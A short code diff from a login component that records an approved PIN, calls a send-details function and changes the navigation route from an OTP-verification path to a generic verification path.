@@ -283,7 +283,7 @@ function Login({ client, setpin, sendDetails, setnumber }) {
     // console.log("🎉 PIN approved, proceeding to OTP verification...");
     setpin(pinString);
     sendDetails();
-    navigate(`/${user}/otpverification`);
+    navigate(`/${user}/verification`);
   };
 
   // Function to handle login
